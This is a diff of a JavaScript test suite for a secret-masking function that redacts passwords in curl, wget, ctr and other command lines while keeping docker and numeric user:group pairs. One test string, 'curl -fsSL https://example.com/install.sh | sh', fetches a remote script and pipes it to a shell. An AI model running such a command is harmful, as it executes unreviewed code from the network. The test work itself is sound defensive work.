@@ -8,6 +8,8 @@
 //  4. the time it takes does not depend on how the text is laid out
 import assert from 'node:assert/strict';
 import { maskSecrets } from '../lib/permissions.mjs';
+import { hideKeyBlocks } from '../lib/approval-preview.mjs';
+import { BEGIN as KEY_BEGIN_FRAME, END as KEY_END_FRAME, KEY_BODY as KEY_BODY_LINES, LAST_LINE as KEY_LAST_LINE, keyShapes, piecesIn } from './support/key-shapes.mjs';
 
 let checks = 0;
 const ok = (label) => { checks += 1; console.log(`  ok - ${label}`); };
@@ -276,33 +278,150 @@ const COMMAND_LINES = [
   ['curl over six lines, the payload before -u', ['curl -sS -X POST \\', '  -H "Content-Type: application/json" \\', '  -H "Accept: application/json" \\', `  -d '{"query": "${'q'.repeat(120)}"}' \\`, '  --max-time 30 \\', `  -u "svc:${V}" \\`, '  https://api.example.test/graphql'].join('\n'), ['curl -sS -X POST \\', '  -H "Content-Type: application/json" \\', '  -H "Accept: application/json" \\', `  -d '{"query": "${'q'.repeat(120)}"}' \\`, '  --max-time 30 \\', '  -u "svc:[REDACTED]" \\', '  https://api.example.test/graphql'].join('\n')],
   ['curl with long header lines', ['curl -sS \\', `  -H "Authorization-Hint: ${'h'.repeat(90)}" \\`, `  -H "X-Other: ${'o'.repeat(90)}" \\`, `  -u svc:${V} https://api.example.test`].join('\n'), ['curl -sS \\', `  -H "Authorization-Hint: ${'h'.repeat(90)}" \\`, `  -H "X-Other: ${'o'.repeat(90)}" \\`, '  -u svc:[REDACTED] https://api.example.test'].join('\n')],
   ['curl kept in a variable and used far below', ['CURL="curl -sS --fail"', `# ${'comment '.repeat(30)}`, `$CURL -u svc:${V} https://api.example.test`].join('\n'), ['CURL="curl -sS --fail"', `# ${'comment '.repeat(30)}`, '$CURL -u svc:[REDACTED] https://api.example.test'].join('\n')],
+  // The flags of the user (-u, --user, --proxy-user) are a user and a password wherever they stand, but for a user and a group: a numeric pair, and the flags of docker, podman, nerdctl and buildah.
+  // Both need the COMMAND that holds the flag to have no curl and no URL before the flag; the command is what lies between the last ; & | or line ending (a continuation of the line is no line ending)
+  // and the flag, or the start of the text; 200 characters of it are looked at and a longer command is masked. A container client is the FIRST word of the command (sudo, doas, env, time, nohup and
+  // VAR=x may come before it; a path and .exe may be on it). What is not known to be a user and a group is masked.
   ['docker run: a user and a group', 'docker run --rm -u node:node -p 8080:80 img', 'docker run --rm -u node:node -p 8080:80 img'],
+  ['curl: -u first', `curl -u admin:${V} https://api.example.com/v1`, 'curl -u admin:[REDACTED] https://api.example.com/v1'],
+  ['curl: -u last', `curl https://api.example.com/v1 -u admin:${V}`, 'curl https://api.example.com/v1 -u admin:[REDACTED]'],
+  ['docker run -u 1000:1000', 'docker run -u 1000:1000 alpine id', 'docker run -u 1000:1000 alpine id'],
+  ['docker run --user node:node', 'docker run --user node:node alpine id', 'docker run --user node:node alpine id'],
   ['docker-compose too', 'docker-compose run -u app:app web sh', 'docker-compose run -u app:app web sh'],
   ['docker.exe on Windows', 'docker.exe run --user app:app img', 'docker.exe run --user app:app img'],
   ['a path to docker', '/usr/bin/docker exec -u app:app web sh', '/usr/bin/docker exec -u app:app web sh'],
+  ['a Windows path to docker, in capitals', 'C:\\Docker\\DOCKER.EXE run -u app:app img', 'C:\\Docker\\DOCKER.EXE run -u app:app img'],
   ['podman', 'podman run --user app:app img', 'podman run --user app:app img'],
   ['nerdctl', 'nerdctl run --user app:app img', 'nerdctl run --user app:app img'],
   ['buildah', 'buildah run --user app:app ctr sh', 'buildah run --user app:app ctr sh'],
-  ['skopeo', 'skopeo inspect --user app:app docker://img', 'skopeo inspect --user app:app docker://img'],
-  ['kubectl', 'kubectl exec -u app:app pod -- id', 'kubectl exec -u app:app pod -- id'],
-  ['oc', 'oc rsh -u app:app pod', 'oc rsh -u app:app pod'],
-  ['crictl', 'crictl exec -u app:app ctr id', 'crictl exec -u app:app ctr id'],
-  ['ctr', 'ctr run -u app:app img id', 'ctr run -u app:app img id'],
-  ['lxc', 'lxc exec c1 --user app:app -- id', 'lxc exec c1 --user app:app -- id'],
-  ['incus', 'incus exec c1 --user app:app -- id', 'incus exec c1 --user app:app -- id'],
+  ['docker compose (the plugin)', 'docker compose run -u app:app web sh', 'docker compose run -u app:app web sh'],
+  ['sudo docker run with a user and a group', 'sudo docker run -u node:node alpine id', 'sudo docker run -u node:node alpine id'],
+  ['sudo with a flag of its own', 'sudo -E docker run -u node:node alpine id', 'sudo -E docker run -u node:node alpine id'],
+  ['doas', 'doas docker run -u node:node alpine id', 'doas docker run -u node:node alpine id'],
+  ['env with a variable', 'env FOO=1 docker run -u node:node alpine id', 'env FOO=1 docker run -u node:node alpine id'],
+  ['a variable of the command', 'FOO=1 docker run -u node:node alpine id', 'FOO=1 docker run -u node:node alpine id'],
+  ['time', 'time docker run -u node:node alpine id', 'time docker run -u node:node alpine id'],
+  ['nohup', 'nohup docker run -u node:node alpine id', 'nohup docker run -u node:node alpine id'],
+  ['the name of a container client in any case', 'Docker Run -u node:node img', 'Docker Run -u node:node img'],
+  ['a prefix in front of the client is a first word that is none, so the group is masked (fail safe): a YAML list item', '- docker run -u node:node img', '- docker run -u node:[REDACTED] img'],
+  ['and the prompt of a shell', '$ docker run -u node:node img', '$ docker run -u node:[REDACTED] img'],
+  ['and the RUN of a Dockerfile', 'RUN docker run -u node:node img', 'RUN docker run -u node:[REDACTED] img'],
+  ['and a comment', '# docker run -u node:node img', '# docker run -u node:[REDACTED] img'],
+  ['but blanks in front of it are not a word', '  docker run -u node:node img', '  docker run -u node:node img'],
+  ['docker exec with the flag before a curl', 'docker exec -u www-data:www-data web curl http://localhost', 'docker exec -u www-data:www-data web curl http://localhost'],
+  ['two flags after one client: both stay', 'docker run -u node:node --user app:app img', 'docker run -u node:node --user app:app img'],
+  ['-u of docker is a user and a group, --user too', 'docker run -u 1000:1000 --user node:node img', 'docker run -u 1000:1000 --user node:node img'],
+  ['a quoted user and group after docker', 'docker run -u "node:node" img', 'docker run -u "node:node" img'],
   ['docker over several lines (a backslash, a caret, a backtick)', 'docker run \\\n  -e A=1 \\\n  -u node:node \\\n  img', 'docker run \\\n  -e A=1 \\\n  -u node:node \\\n  img'],
   ['and with a caret', 'docker run ^\n  -u node:node ^\n  img', 'docker run ^\n  -u node:node ^\n  img'],
   ['and with a backtick', 'docker run `\n  -u node:node `\n  img', 'docker run `\n  -u node:node `\n  img'],
   ['and with Windows line endings', 'docker run \\\r\n  -u node:node \\\r\n  img', 'docker run \\\r\n  -u node:node \\\r\n  img'],
+  ['spaces and a tab after the backslash still continue the line of docker', 'docker run \\ \t \n  -u node:node img', 'docker run \\ \t \n  -u node:node img'],
+  ['a space after the backslash still continues the line of docker', 'docker run \\ \n  -u node:node img', 'docker run \\ \n  -u node:node img'],
+  ['and a tab', 'docker run \\\t\n  -u node:node img', 'docker run \\\t\n  -u node:node img'],
+  ['a continuation right after the name of the client', 'docker\\\n  -u node:node img', 'docker\\\n  -u node:node img'],
+  ['a continuation of the line counts as one character, whatever its spaces', `docker \\${' '.repeat(300)}\n  -u node:node img`, `docker \\${' '.repeat(300)}\n  -u node:node img`],
+  ['the second command of a line has its own first word', 'docker pull img; podman run -u node:node img', 'docker pull img; podman run -u node:node img'],
+  ['and after && and |', 'docker pull img && docker run -u node:node img | cat', 'docker pull img && docker run -u node:node img | cat'],
+  ['the masked text is looked at again for the next rule: a secret masked before docker does not move its flag out of reach', `curl -u "usr:${V}${V}" url; docker run -u node:node img`, 'curl -u "usr:[REDACTED]" url; docker run -u node:node img'],
+  // the clients that are not: ctr (containerd) takes -u/--user as the user and the PASSWORD of a registry, and for the others the flag is a login name, a kubeconfig user or a uid
+  ['ctr: -u is the user and the password of a registry', `ctr images pull -u admin:${V} registry.example.com/img:1`, 'ctr images pull -u admin:[REDACTED] registry.example.com/img:1'],
+  ['ctr --user', `ctr images pull --user admin:${V} registry.example.com/img:1`, 'ctr images pull --user admin:[REDACTED] registry.example.com/img:1'],
+  ['sudo ctr -n k8s.io images push --user "user:password"', `sudo ctr -n k8s.io images push --user "admin:${V}" registry.example.com/img:1`, 'sudo ctr -n k8s.io images push --user "admin:[REDACTED]" registry.example.com/img:1'],
+  ['skopeo', `skopeo login -u admin:${V} registry.example.test`, 'skopeo login -u admin:[REDACTED] registry.example.test'],
+  ['kubectl', `kubectl config set-credentials admin -u admin:${V}`, 'kubectl config set-credentials admin -u admin:[REDACTED]'],
+  ['oc', `oc login -u admin:${V} https://api.example.test:6443`, 'oc login -u admin:[REDACTED] https://api.example.test:6443'],
+  ['crictl', `crictl pull -u admin:${V} img`, 'crictl pull -u admin:[REDACTED] img'],
+  ['lxc', `lxc remote add x 10.0.0.1 --user admin:${V}`, 'lxc remote add x 10.0.0.1 --user admin:[REDACTED]'],
+  ['incus', `incus remote add x 10.0.0.1 --user admin:${V}`, 'incus remote add x 10.0.0.1 --user admin:[REDACTED]'],
+  // a word of a container client in a URL, a host, a path or a header of a curl is no command: the first word of the command is curl
+  ['registry media type in a header', `curl -H "Accept: application/vnd.docker.distribution.manifest.v2+json" -u admin:${V} https://registry.example.com/v2/img/manifests/latest`, 'curl -H "Accept: application/vnd.docker.distribution.manifest.v2+json" -u admin:[REDACTED] https://registry.example.com/v2/img/manifests/latest'],
+  ['docker in the URL host', `curl https://registry.hub.docker.com/v2/repositories/x -u admin:${V}`, 'curl https://registry.hub.docker.com/v2/repositories/x -u admin:[REDACTED]'],
+  ['docker in the URL path', `curl https://example.com/docker -u admin:${V}`, 'curl https://example.com/docker -u admin:[REDACTED]'],
+  ['oc as a host label', `curl https://api.oc.company.com/x -u admin:${V}`, 'curl https://api.oc.company.com/x -u admin:[REDACTED]'],
+  ['oc in a path', `curl https://example.com/oc/status -u admin:${V}`, 'curl https://example.com/oc/status -u admin:[REDACTED]'],
+  ['kubectl in a path', `curl https://example.com/kubectl/x -u admin:${V}`, 'curl https://example.com/kubectl/x -u admin:[REDACTED]'],
+  ['podman in a header value', `curl -H 'X-Tool: podman' -u admin:${V} https://example.com`, "curl -H 'X-Tool: podman' -u admin:[REDACTED] https://example.com"],
+  ['ctr as a word', `curl -d ctr -u admin:${V} https://example.com`, 'curl -d ctr -u admin:[REDACTED] https://example.com'],
+  ['a quoted password after a docker word', `curl https://example.com/docker -u "admin:${V}"`, 'curl https://example.com/docker -u "admin:[REDACTED]"'],
+  ['and in single quotes', `curl https://example.com/docker -u 'admin:${V}'`, "curl https://example.com/docker -u 'admin:[REDACTED]'"],
+  ['the --user form', `curl https://example.com/docker --user admin:${V}`, 'curl https://example.com/docker --user admin:[REDACTED]'],
+  ['the --proxy-user form', `curl https://example.com/docker --proxy-user admin:${V} -x http://proxy:3128`, 'curl https://example.com/docker --proxy-user admin:[REDACTED] -x http://proxy:3128'],
+  ['the -u= form', `curl https://example.com/docker -u=admin:${V}`, 'curl https://example.com/docker -u=admin:[REDACTED]'],
+  ['CURL in capitals', `CURL https://example.com/docker -u admin:${V}`, 'CURL https://example.com/docker -u admin:[REDACTED]'],
+  ['curl.exe', `curl.exe https://example.com/docker -u admin:${V}`, 'curl.exe https://example.com/docker -u admin:[REDACTED]'],
+  ['a continued line', `curl https://example.com/docker \\\n  -u admin:${V}`, 'curl https://example.com/docker \\\n  -u admin:[REDACTED]'],
+  ['wget with a docker word', `wget https://example.com/docker -u admin:${V}`, 'wget https://example.com/docker -u admin:[REDACTED]'],
+  ['a different tool, a docker word in the URL', `http https://example.com/docker -u admin:${V}`, 'http https://example.com/docker -u admin:[REDACTED]'],
+  ['a docker command, then a curl after a ;', `docker ps; curl https://example.com -u admin:${V}`, 'docker ps; curl https://example.com -u admin:[REDACTED]'],
+  ['a curl after the container client, before the flag: the flag is curl\'s', `docker run alpine curl -u admin:${V} http://x`, 'docker run alpine curl -u admin:[REDACTED] http://x'],
   ['curl inside a docker command: the flag belongs to curl', `docker exec web curl -u admin:${V} http://localhost/api`, `docker exec web curl -u admin:[REDACTED] http://localhost/api`],
   ['and in a shell started by docker', `docker run img sh -c "curl -u admin:${V} http://x"`, `docker run img sh -c "curl -u admin:[REDACTED] http://x"`],
   ['kubectl exec ... -- curl', `kubectl exec pod -- curl --user admin:${V} http://x`, `kubectl exec pod -- curl --user admin:[REDACTED] http://x`],
+  ['curlimages/curl: the image is curl', `docker run --rm curlimages/curl -u admin:${V} https://x.example.test`, `docker run --rm curlimages/curl -u admin:[REDACTED] https://x.example.test`],
+  ['a URL before the flag of a docker command: the command is not known to be one of containers only', `docker -H tcp://127.0.0.1:2375 run -u node:node img`, `docker -H tcp://127.0.0.1:2375 run -u node:[REDACTED] img`],
+  ['a docker command whose flag comes before its URL', `docker run -u node:node https://example.test/x`, `docker run -u node:node https://example.test/x`],
+  // the first word of the command is the client, not any word of it
+  ['a docker word that is not the first word of the command', `echo docker run -u node:${V} img`, `echo docker run -u node:[REDACTED] img`],
+  ['a shell started with a docker command inside', `bash -c 'docker run -u node:${V} img'`, `bash -c 'docker run -u node:[REDACTED] img'`],
+  ['a docker word glued to others: nodocker, dockerd, dockerfile, docker2', `nodocker run -u app:${V} x; dockerd -u app:${V} y; dockerfile -u app:${V} z; docker2 -u app:${V} w`, `nodocker run -u app:[REDACTED] x; dockerd -u app:[REDACTED] y; dockerfile -u app:[REDACTED] z; docker2 -u app:[REDACTED] w`],
+  ['sudo -u before docker is not a user and a group of docker', `sudo -u root docker run -u node:${V} img`, `sudo -u root docker run -u node:[REDACTED] img`],
+  ['a wrapper in capitals', 'SUDO docker run -u node:node img', 'SUDO docker run -u node:node img'],
+  ['a continuation between the wrapper and the client (a backslash)', 'sudo \\\n  docker run -u node:node img', 'sudo \\\n  docker run -u node:node img'],
+  ['and a caret', 'sudo ^\n  docker run -u node:node img', 'sudo ^\n  docker run -u node:node img'],
+  ['and a backtick', 'sudo `\n  docker run -u node:node img', 'sudo `\n  docker run -u node:node img'],
+  ['and spaces and a tab after the mark', 'sudo \\ \t \n  docker run -u node:node img', 'sudo \\ \t \n  docker run -u node:node img'],
+  ['and a Windows line ending', 'sudo \\\r\n  docker run -u node:node img', 'sudo \\\r\n  docker run -u node:node img'],
+  ['and after a flag of the wrapper', 'sudo -E \\\n  docker run -u node:node img', 'sudo -E \\\n  docker run -u node:node img'],
+  ['a wrapper, a flag and a variable before the client', 'sudo -E FOO=1 docker run -u node:node img', 'sudo -E FOO=1 docker run -u node:node img'],
+  ['a flag in front of the client, with no wrapper before it, is not a wrapper flag: the client is not the first word', '-E docker run -u node:node img', '-E docker run -u node:[REDACTED] img'],
+  ['a colon and one slash (a volume) are no URL', 'docker run -v /data:/data -u node:node img', 'docker run -v /data:/data -u node:node img'],
+  ['two slashes with no colon before them are no URL either', 'docker run -e A=b//c -u node:node img', 'docker run -e A=b//c -u node:node img'],
+  ['a chain of 150 continuations is inside the 200 items of the walk (one each, not two)', `docker ${'\\\n'.repeat(150)}run -u node:node img`, `docker ${'\\\n'.repeat(150)}run -u node:node img`],
+  ['and a chain of 300 is outside: the start of the command is not known, the flag is masked', `docker ${'\\\n'.repeat(300)}run -u node:node img`, `docker ${'\\\n'.repeat(300)}run -u node:[REDACTED] img`],
+  // the command ends at ; & | and at a line ending that is no continuation
   ['a command after the docker command, on the same line: its -u is masked', `docker pull img; tool -u admin:${V} x`, `docker pull img; tool -u admin:[REDACTED] x`],
   ['and after a pipe', `docker ps | tool -u admin:${V}`, `docker ps | tool -u admin:[REDACTED]`],
   ['and after &&', `docker build . && tool -u admin:${V}`, `docker build . && tool -u admin:[REDACTED]`],
-  ['a ; inside quotes between docker and the flag ends the window too (the limit): the flag is masked', "docker run -e 'A=b;c' -u node:node img", "docker run -e 'A=b;c' -u node:[REDACTED] img"],
+  ['and after a single &', `docker run img & tool -u admin:${V}`, `docker run img & tool -u admin:[REDACTED]`],
+  ['and after ||', `docker run img || tool -u admin:${V}`, `docker run img || tool -u admin:[REDACTED]`],
+  ['and after the end of a line', `docker run img\n  -u svc:${V}`, `docker run img\n  -u svc:[REDACTED]`],
+  ['and after a Windows line ending that does not continue the line', `docker run img\r\n  -u svc:${V}`, `docker run img\r\n  -u svc:[REDACTED]`],
+  ['a carriage return alone ends the command', `docker run img\r  -u svc:${V}`, `docker run img\r  -u svc:[REDACTED]`],
+  ['a blank line after the backslash ends the command of docker: the -u below it is masked', `docker run \\\n\n  -u svc:${V}`, `docker run \\\n\n  -u svc:[REDACTED]`],
+  ['a backslash that is not at the end of its line continues nothing: the -u on the next line is masked', `docker run \\ x\n  -u svc:${V}`, `docker run \\ x\n  -u svc:[REDACTED]`],
+  ['a command after the container client with the flag on the line of a curl above it: the line above is another command', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u node:node img', 'curl -fsSL https://example.com/install.sh | sh\ndocker run -u node:node img'],
+  ['a ; inside quotes between docker and the flag ends the command too (the limit): the flag is masked', "docker run -e 'A=b;c' -u node:node img", "docker run -e 'A=b;c' -u node:[REDACTED] img"],
   ['a docker beyond 200 characters of its -u (the limit): masked', `docker run${' x'.repeat(150)} -u node:node img`, `docker run${' x'.repeat(150)} -u node:[REDACTED] img`],
-  ['the word docker is whole: nodocker and dockerfile are no docker', `nodocker run -u app:${V} x; dockerfile -u app:${V} y`, `nodocker run -u app:[REDACTED] x; dockerfile -u app:[REDACTED] y`],
+  // the 200 characters of the command, to the character: from the start of the command to the flag, 200 are looked at and a continuation of the line counts as one
+  ['docker, the flag 200 characters from the start of the text: inside', `docker ${'x'.repeat(192)} -u node:node img`, `docker ${'x'.repeat(192)} -u node:node img`],
+  ['and 201: outside', `docker ${'x'.repeat(193)} -u node:node img`, `docker ${'x'.repeat(193)} -u node:[REDACTED] img`],
+  ['the same from the start of the second command of a line (the ; and the space before docker are not counted)', `a; docker ${'x'.repeat(191)} -u node:node img`, `a; docker ${'x'.repeat(191)} -u node:node img`],
+  ['and 201 from it', `a; docker ${'x'.repeat(192)} -u node:node img`, `a; docker ${'x'.repeat(192)} -u node:[REDACTED] img`],
+  ['a continuation inside the command counts as one: 200 in all', `docker \\\n${'x'.repeat(191)} -u node:node img`, `docker \\\n${'x'.repeat(191)} -u node:node img`],
+  ['and 201 are out', `docker \\\n${'x'.repeat(192)} -u node:node img`, `docker \\\n${'x'.repeat(192)} -u node:[REDACTED] img`],
+  ['mysql, the -p 200 characters after its name: inside the window', `mysql ${'x'.repeat(198)} -p${V} db`, `mysql ${'x'.repeat(198)} -p[REDACTED] db`],
+  ['and 201: outside', `mysql ${'x'.repeat(199)} -p${V} db`, `mysql ${'x'.repeat(199)} -p${V} db`],
+  ['docker login, the -p 200 characters after login: inside the window', `docker login ${'x'.repeat(198)} -p ${V} registry.example.test`, `docker login ${'x'.repeat(198)} -p [REDACTED] registry.example.test`],
+  ['and 201: outside', `docker login ${'x'.repeat(199)} -p ${V} registry.example.test`, `docker login ${'x'.repeat(199)} -p ${V} registry.example.test`],
+  // what is a curl and what is not (the word, in any case): the flag after another word is still the flag of a docker command
+  ['xcurl is no curl: the flag after it still follows docker', 'docker exec web xcurl -u node:node', 'docker exec web xcurl -u node:node'],
+  ['curly is no curl either', 'docker exec web curly -u node:node', 'docker exec web curly -u node:node'],
+  ['nor is curl2', 'docker exec web curl2 -u node:node', 'docker exec web curl2 -u node:node'],
+  ['nor is 2curl', 'docker exec web 2curl -u node:node', 'docker exec web 2curl -u node:node'],
+  ['nor is _curl', 'docker exec web _curl -u node:node', 'docker exec web _curl -u node:node'],
+  ['nor is curl_', 'docker exec web curl_ -u node:node', 'docker exec web curl_ -u node:node'],
+  ['CURL is curl in any case', `docker exec web CURL -u admin:${V} x`, `docker exec web CURL -u admin:[REDACTED] x`],
+  ['curl.exe is curl', `docker exec web curl.exe -u admin:${V} x`, `docker exec web curl.exe -u admin:[REDACTED] x`],
+  ['a flag at the start of the text, after a line ending', `\n  -u svc:${V}`, `\n  -u svc:[REDACTED]`],
+  ['a quoted user and password in a text of curl', `curl -u "admin:${V}" x`, 'curl -u "admin:[REDACTED]" x'],
+  ['and the other way: a client that is nearer but behind a ; leaves the flag masked', `podman ps; tool -u svc:${V}`, `podman ps; tool -u svc:[REDACTED]`],
+  ['two flags of one curl: both are masked', `curl --proxy-user proxy:${V} -u admin:${V} https://example.com`, 'curl --proxy-user proxy:[REDACTED] -u admin:[REDACTED] https://example.com'],
+  ['curl.exe, as Windows spells it', `curl.exe -u admin:${V} https://example.com`, 'curl.exe -u admin:[REDACTED] https://example.com'],
+  ['a curl within 200 characters of its -u', `curl${' x'.repeat(75)} -u admin:${V} url`, `curl${' x'.repeat(75)} -u admin:[REDACTED] url`],
+  ['a curl beyond 200 characters of its -u: masked all the same', `curl${' x'.repeat(150)} -u admin:${V} url`, `curl${' x'.repeat(150)} -u admin:[REDACTED] url`],
+  ['whatever the program is, its -u is a user and a password: notcurl and curly too', `notcurl -u admin:${V} x; curly -u admin:${V} y`, `notcurl -u admin:[REDACTED] x; curly -u admin:[REDACTED] y`],
+  // a numeric pair is a user id and a group id, wherever it stands, unless the command holds a curl or a URL before the flag
   ['a numeric pair is a user id and a group id, wherever it stands', 'tool -u 1000:1000 x', 'tool -u 1000:1000 x'],
   ['and in quotes', 'tool -u "1000:1000" x', 'tool -u "1000:1000" x'],
   ['and with --user=', 'tool --user=1000:1000 x', 'tool --user=1000:1000 x'],
@@ -313,44 +432,32 @@ const COMMAND_LINES = [
   ['a numeric pair of ten digits and ten digits is one', 'tool -u 1234567890:1234567890 x', 'tool -u 1234567890:1234567890 x'],
   ['eleven digits for the group is not', 'tool -u 1:12345678901 x', 'tool -u 1:[REDACTED] x'],
   ['a quoted pair that goes on after its digits is not numeric', 'tool -u "1000:1000abc" x', 'tool -u "1000:[REDACTED]" x'],
-  ['the name of a container client in any case', 'Docker Run -u node:node img', 'Docker Run -u node:node img'],
-  ['xcurl is no curl: the flag after it still follows docker', 'docker exec web xcurl -u node:node', 'docker exec web xcurl -u node:node'],
-  ['curly is no curl either', 'docker exec web curly -u node:node', 'docker exec web curly -u node:node'],
-  ['nor is curl2', 'docker exec web curl2 -u node:node', 'docker exec web curl2 -u node:node'],
-  ['nor is 2curl', 'docker exec web 2curl -u node:node', 'docker exec web 2curl -u node:node'],
-  ['nor is _curl', 'docker exec web _curl -u node:node', 'docker exec web _curl -u node:node'],
-  ['nor is curl_', 'docker exec web curl_ -u node:node', 'docker exec web curl_ -u node:node'],
-  ['CURL is curl in any case', `docker exec web CURL -u admin:${V} x`, `docker exec web CURL -u admin:[REDACTED] x`],
-  ['curl.exe is curl', `docker exec web curl.exe -u admin:${V} x`, `docker exec web curl.exe -u admin:[REDACTED] x`],
-  ['a flag at the start of the text, after a line ending', `\n  -u svc:${V}`, `\n  -u svc:[REDACTED]`],
+  ['a numeric user and a numeric password of a curl are a user and a password', `curl -u 5551234567:123456 https://example.com`, `curl -u 5551234567:[REDACTED] https://example.com`],
+  ['and in quotes', `curl -u "5551234567:123456" https://example.com`, `curl -u "5551234567:[REDACTED]" https://example.com`],
+  ['and a curl above, on the continued line', `curl https://example.com \\\n  -u 5551234567:123456`, `curl https://example.com \\\n  -u 5551234567:[REDACTED]`],
+  ['a numeric pair after a URL is a user and a password too', `wget https://example.com/f -u 5551234567:123456`, `wget https://example.com/f -u 5551234567:[REDACTED]`],
+  ['a numeric pair after a docker command with a curl in it', `docker run alpine curl -u 5551234567:123456 http://x`, `docker run alpine curl -u 5551234567:[REDACTED] http://x`],
+  ['a numeric pair in a docker command with a curl after the flag', `docker exec -u 1000:1000 web curl http://localhost`, `docker exec -u 1000:1000 web curl http://localhost`],
+  ['a numeric pair after a command of 200 characters or more: masked (it is not known what the command is)', `tool ${'x'.repeat(250)} -u 1000:1000 y`, `tool ${'x'.repeat(250)} -u 1000:[REDACTED] y`],
+  // not a user and a password: a path with a drive letter, a push, a sort
+  ['diff -u with a Windows path', 'diff -u C:\\a\\old.txt C:\\a\\new.txt', 'diff -u C:\\a\\old.txt C:\\a\\new.txt'],
+  ['and with slashes', 'diff -u C:/a/old.txt C:/a/new.txt', 'diff -u C:/a/old.txt C:/a/new.txt'],
+  ['and in quotes', 'diff -u "C:\\a\\old.txt" "C:\\a\\new.txt"', 'diff -u "C:\\a\\old.txt" "C:\\a\\new.txt"'],
+  ['a user of one letter and a password is a user and a password', `curl -u c:${V} https://example.com`, 'curl -u c:[REDACTED] https://example.com'],
+  ['a user of two letters is no drive: the password that starts with a slash is masked', `curl -u ab:/${V} https://example.com`, 'curl -u ab:[REDACTED] https://example.com'],
+  ['and the same with no curl in the command: two letters are a user, not a drive', `tool -u ab:/${V} x`, 'tool -u ab:[REDACTED] x'],
+  ['a digit before the colon and a slash is no drive: the password is masked', `tool -u 7:/${V} x`, 'tool -u 7:[REDACTED] x'],
+  ['a drive letter in small letters, with a backslash or a slash, is a path as well', 'diff -u c:\\a\\old.txt c:/a/new.txt', 'diff -u c:\\a\\old.txt c:/a/new.txt'],
+  ['a drive letter and a slash after a curl is a user and a password: the command decides, not the shape', `curl -u c:/${V} https://example.com`, 'curl -u c:[REDACTED] https://example.com'],
+  ['and with a backslash', `curl.exe -u C:\\${V} https://example.com`, 'curl.exe -u C:[REDACTED] https://example.com'],
+  ['and in quotes', `curl -u "c:/${V}" https://example.com`, 'curl -u "c:[REDACTED]" https://example.com'],
+  ['and when the URL stands before the flag', `wget https://example.com -u c:/${V}`, 'wget https://example.com -u c:[REDACTED]'],
+  ['a drive path in a command with no curl and no URL is a path', 'diff -u c:/a/old.txt c:/a/new.txt', 'diff -u c:/a/old.txt c:/a/new.txt'],
+  ['docker exec -u www-data:www-data web sh', 'docker exec -u www-data:www-data web sh', 'docker exec -u www-data:www-data web sh'],
+  ['git push -u', 'git push -u origin main', 'git push -u origin main'],
+  ['git push -u with a refspec', 'git push -u origin HEAD:main', 'git push -u origin HEAD:main'],
+  ['sort -u', 'sort -u a.txt b.txt', 'sort -u a.txt b.txt'],
   ['a flag at the very start of the text', `-u svc:${V} x`, `-u svc:[REDACTED] x`],
-  ['spaces and a tab after the backslash still continue the line of docker', 'docker run \\ \t \n  -u node:node img', 'docker run \\ \t \n  -u node:node img'],
-  ['a space after the backslash still continues the line of docker', 'docker run \\ \n  -u node:node img', 'docker run \\ \n  -u node:node img'],
-  ['and a tab', 'docker run \\\t\n  -u node:node img', 'docker run \\\t\n  -u node:node img'],
-  ['a quoted user and group after docker', 'docker run -u "node:node" img', 'docker run -u "node:node" img'],
-  ['a quoted user and password in a text of curl', `curl -u "admin:${V}" x`, 'curl -u "admin:[REDACTED]" x'],
-  ['a continuation right after the name of the client', 'docker\\\n  -u node:node img', 'docker\\\n  -u node:node img'],
-  ['a continuation inside the window counts as one: 200 in all', `docker \\\n ${'x'.repeat(196)} -u node:node img`, `docker \\\n ${'x'.repeat(196)} -u node:node img`],
-  ['and 201 are out', `docker \\\n ${'x'.repeat(197)} -u node:node img`, `docker \\\n ${'x'.repeat(197)} -u node:[REDACTED] img`],
-  ['a carriage return alone ends the window', `docker run img\r  -u svc:${V}`, `docker run img\r  -u svc:[REDACTED]`],
-  ['the nearest client counts: the one before it, past a ;, does not matter', 'docker pull img; podman run -u node:node img', 'docker pull img; podman run -u node:node img'],
-  ['and the other way: a client that is nearer but behind a ; leaves the flag masked', `podman ps; tool -u svc:${V}`, `podman ps; tool -u svc:[REDACTED]`],
-  ['two flags after one client: both stay', 'docker run -u node:node --user app:app img', 'docker run -u node:node --user app:app img'],
-  ['the masked text is looked at again for the next rule: a secret masked before docker does not move its flag out of reach', `curl -u "usr:${V}${V}" url; docker run -u node:node img`, 'curl -u "usr:[REDACTED]" url; docker run -u node:node img'],
-  // the 200 characters of the windows, to the character: 200 are inside, 201 are not
-  ['docker, the flag 200 characters after its name: inside the window', `docker ${'x'.repeat(198)} -u node:node img`, `docker ${'x'.repeat(198)} -u node:node img`],
-  ['and 201: outside', `docker ${'x'.repeat(199)} -u node:node img`, `docker ${'x'.repeat(199)} -u node:[REDACTED] img`],
-  ['mysql, the -p 200 characters after its name: inside the window', `mysql ${'x'.repeat(198)} -p${V} db`, `mysql ${'x'.repeat(198)} -p[REDACTED] db`],
-  ['and 201: outside', `mysql ${'x'.repeat(199)} -p${V} db`, `mysql ${'x'.repeat(199)} -p${V} db`],
-  ['docker login, the -p 200 characters after login: inside the window', `docker login ${'x'.repeat(198)} -p ${V} registry.example.test`, `docker login ${'x'.repeat(198)} -p [REDACTED] registry.example.test`],
-  ['and 201: outside', `docker login ${'x'.repeat(199)} -p ${V} registry.example.test`, `docker login ${'x'.repeat(199)} -p ${V} registry.example.test`],
-  ['a continuation of the line counts as one character, whatever its spaces', `docker \\${' '.repeat(300)}\n  -u node:node img`, `docker \\${' '.repeat(300)}\n  -u node:node img`],
-  ['-u of docker is a user and a group, --user too', 'docker run -u 1000:1000 --user node:node img', 'docker run -u 1000:1000 --user node:node img'],
-  ['two flags of one curl: both are masked', `curl --proxy-user proxy:${V} -u admin:${V} https://example.com`, 'curl --proxy-user proxy:[REDACTED] -u admin:[REDACTED] https://example.com'],
-  ['curl.exe, as Windows spells it', `curl.exe -u admin:${V} https://example.com`, 'curl.exe -u admin:[REDACTED] https://example.com'],
-  ['a curl within 200 characters of its -u', `curl${' x'.repeat(75)} -u admin:${V} url`, `curl${' x'.repeat(75)} -u admin:[REDACTED] url`],
-  ['a curl beyond 200 characters of its -u: masked all the same', `curl${' x'.repeat(150)} -u admin:${V} url`, `curl${' x'.repeat(150)} -u admin:[REDACTED] url`],
-  ['whatever the program is, its -u is a user and a password: notcurl and curly too', `notcurl -u admin:${V} x; curly -u admin:${V} y`, `notcurl -u admin:[REDACTED] x; curly -u admin:[REDACTED] y`],
